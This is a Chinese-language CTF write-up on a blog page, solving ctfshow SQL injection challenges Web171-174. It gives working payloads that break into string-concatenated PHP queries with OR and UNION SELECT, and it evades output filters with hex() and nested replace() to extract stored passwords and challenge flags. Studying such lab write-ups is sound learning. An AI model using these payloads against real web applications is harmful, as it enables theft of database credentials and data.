<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow SQL注入Web171-174 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow SQL注入Web171-174" />
<meta property="og:description" content="42022/4/24
SQL注入 Web171 语法：查询表中的数据
查询所有行
命令： select &lt;字段1，字段2，...&gt; from &lt; 表名 &gt; where &lt; 条件&gt;
例如：查看表 MyClass 中所有数据
mysql&gt; select * from MyClass;查询语句
//拼接sql语句查找指定ID用户
$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
select username,password from user where username !=&#39;flag&#39; and id = ‘10000’;(输入一个很大的，表中没有的值或者-1) or id=’26’ limit 1;
Playload:
10000’ or id=’26 试了一下25不是，就试一下26
ctfshow{4d873b5b-6861-4d54-bed8-7e3b857d878a} Web172 &#34;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;注入的地方&#39; limit 1;&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/77ae52c5e605ff2171a80095d4221d5d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-26T21:10:53+08:00" />
<meta property="article:modified_time" content="2022-04-26T21:10:53+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow SQL注入Web171-174</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p style="margin-left:.0001pt;text-align:justify;">42022/4/24</p> 
<h2 style="margin-left:.0001pt;text-align:justify;">SQL注入 </h2> 
<h3 style="margin-left:.0001pt;text-align:justify;">Web171</h3> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#fe2c24;">语法：查询表中的数据</span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#fe2c24;">查询所有行</span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#fe2c24;">命令： select &lt;字段1，字段2，...&gt; from &lt; 表名 &gt; where &lt; 条件&gt;</span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#fe2c24;">例如：查看表 MyClass 中所有数据</span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#fe2c24;">mysql&gt; select * from MyClass;查询语句</span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="300" src="https://images2.imgbox.com/57/15/yhP03ynO_o.png" width="691"></p> 
<p style="margin-left:.0001pt;text-align:justify;">//拼接sql语句查找指定ID用户</p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#00b050;">$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">select username,password from user where username !='flag' and id = ‘</span><span style="color:#ff0000;">10000</span><span style="color:#ff0000;">’</span><span style="color:#ff0000;">;</span><span style="color:#ff0000;">(输入一个很大的，表中没有的值</span><span style="color:#ff0000;">或者-1</span><span style="color:#ff0000;">) or id=</span><span style="color:#ff0000;">’</span><span style="color:#ff0000;">26</span><span style="color:#ff0000;">’</span><span style="color:#ff0000;"> limit 1;</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#000000;">Playload:</span></p> 
<pre><code>10000’ or id=’26</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#000000;">试了一下25不是，就试一下26</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="194" src="https://images2.imgbox.com/99/a0/ol0FQgiW_o.png" width="692"></p> 
<pre><code>ctfshow{4d873b5b-6861-4d54-bed8-7e3b857d878a}</code></pre> 
<h3 style="margin-left:.0001pt;text-align:justify;"><span style="color:#666666;">Web172</span></h3> 
<p> <img alt="" height="388" src="https://images2.imgbox.com/f9/56/bUJtpKw9_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;">"select username,password from ctfshow_user2 where username !='flag' and id = '<span style="color:#ff0000;">注入的地方</span><span style="color:#ff0000;">'</span> limit 1;";</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">这题是使用联合查询</p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">select username,password from ctfshow_user2 where username !='flag' and id = '9999'union select id,password from ctfshow_user2 where username = 'flag';</span></p> 
<p style="margin-left:.0001pt;text-align:justify;">虽然前面的语句查不到，但是联合查询是去并集的所以后面的语句查询得到，因为题目不允许username为flag，所以直接查id和password</p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#000000;">Playload:</span></p> 
<pre><code>9999'union select id,password from ctfshow_user2 where username = 'flag</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="99" src="https://images2.imgbox.com/0b/9d/9Do7M2Yt_o.png" width="692"></p> 
<pre><code>ctfshow{710c102e-edec-40df-b78e-2368eb478572} </code></pre> 
<h3 style="margin-left:.0001pt;text-align:justify;">Web173</h3> 
<p><img alt="" height="253" src="https://images2.imgbox.com/0f/3a/FpDazJ9z_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>查询语句：</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>//拼接sql语句查找指定ID用户</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>返回逻辑</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>//检查结果是否有flag</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>    if(!preg_match('/flag/i', json_encode($ret))){<!-- --></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>      $ret['msg']='查询成功';</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>}</strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">意思是结果不可以有flag</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">select id,username,password from ctfshow_user3</span><span style="color:#ff0000;"> where id ='</span><span style="color:#00b050;">9999'union select id,hex(</span><span style="color:#00b050;">a</span><span style="color:#00b050;">.username),b.password from ctfshow_user3 as </span><span style="color:#00b050;">a</span><span style="color:#00b050;"> where </span><span style="color:#00b050;">a</span><span style="color:#00b050;">.username='flag</span><span style="color:#ff0000;">';</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#000000;">法1：用web172的方法</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">select</span><span style="color:#000000;"> id,username,password </span><span style="color:#ff0000;">from ctfshow_user3 where username !='flag' and id = </span><span style="color:#ff0000;">'</span><span style="color:#00b050;">9999'union select id,id,password from ctfshow_user2 where username = 'flag</span><span style="color:#ff0000;">';</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">(注意因为此题目查询了三个列，我们联合查询也要查询3个列所以我写了两个id)</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#000000;">Playload:</span></p> 
<pre><code>9999'union select id,id,password from ctfshow_user3 where username = 'flag</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="121" src="https://images2.imgbox.com/66/a7/4B5Pf9Qg_o.png" width="691"></p> 
<p style="margin-left:.0001pt;text-align:justify;">法2：</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">用16进制编码username使用户名不出现flag   </p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#ff0000;">select id,username,password from ctfshow_user3 where id ='</span><span style="color:#00b050;">9999'union select id,hex(</span><span style="color:#00b050;">a</span><span style="color:#00b050;">.username),b.password from ctfshow_user3 as </span><span style="color:#00b050;">a</span><span style="color:#00b050;"> where </span><span style="color:#00b050;">a</span><span style="color:#00b050;">.username='flag</span><span style="color:#ff0000;">';</span></p> 
<p style="margin-left:.0001pt;text-align:justify;">Playload：</p> 
<pre><code>9999'union select id,hex(a.username),a.password from ctfshow_user3 as a where a.username='flag</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="112" src="https://images2.imgbox.com/3d/3e/3zVmyM0X_o.png" width="692"></p> 
<p></p> 
<pre><code>ctfshow{1e4e1030-87af-4a47-ae52-c1320628af06}</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">2022/4/26</p> 
<h3 style="margin-left:.0001pt;text-align:justify;">Web174</h3> 
<p style="margin-left:.0001pt;text-align:justify;">返回值过滤了数字和flag</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="250" src="https://images2.imgbox.com/a8/df/20EvkKbK_o.png" width="693"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">查询语句：</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">//拼接sql语句查找指定ID用户</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">返回逻辑：</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">//检查结果是否有flag</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){<!-- --></span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">      $ret['msg']='查询成功';</span></p> 
<p style="margin-left:.0001pt;text-align:justify;"><span style="color:#1c7331;">    }</span></p> 
<p style="margin-left:.0001pt;text-align:justify;">Playload:</p> 
<pre><code>9999'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'1','nba'),'2','nbb'),'3','nbc'),'4','nbd'),'5','nbe'),'6','nbf'),'7','nbg'),'8','nbh'),'9','nbi'),'0','nbj'),'a' from ctfshow_user4 where username='flag'--+</code></pre> 
<p> <img alt="" height="130" src="https://images2.imgbox.com/77/ff/FHjuNvsv_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><span style="color:#ff0000;"><strong>因为返回值过滤了数字和flag所以用别的字符替换掉数字然后再转换回去</strong></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">替换回去的py脚本:</p> 
<pre><code>nb='ctfshow{nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbenbcnbanbcnbbnbfnbcnbfnbfnbfnbcnbcnbenbfnbfnbbDnbfnbanbfnbcnbcnbanbcnbhnbbDnbcnbdnbcnbbnbfnbanbcnbanbbDnbfnbbnbcnbgnbcnbcnbcnbcnbbDnbfnbdnbfnbbnbfnbcnbfnbbnbcnbdnbcnbfnbcnbjnbcnbanbcnbdnbcnbbnbfnbfnbcnbjnbgD}'
#nb表示number
nb=nb.replace('nba','1')
nb=nb.replace('nbb','2')
nb=nb.replace('nbc','3')
nb=nb.replace('nbd','4')
nb=nb.replace('nbe','5')
nb=nb.replace('nbf','6')
nb=nb.replace('nbg','7')
nb=nb.replace('nbh','8')
nb=nb.replace('nbi','9')
nb=nb.replace('nbj','0')
print(nb)</code></pre> 
<p> <img alt="" height="351" src="https://images2.imgbox.com/73/43/5w3r7fpc_o.png" width="692"></p> 
<pre><code>{63746673686F777B35313263666335662D616331382D343261312D623733332D6462636234363031343266307D}</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">再用16进制转字符串</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="142" src="https://images2.imgbox.com/97/e9/SpMh563x_o.png" width="692"></p> 
<pre><code>ctfshow{512cfc5f-ac18-42a1-b733-dbcb460142f0} </code></pre> 
<p></p> 
<p></p> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/701fa75583b9c074ed96698d8216ecf3/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">vue elementUI中级联选择器获取label值？</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/78cbd711a85586c8b875795d730dff2d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">攻防世界-shrine write up</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>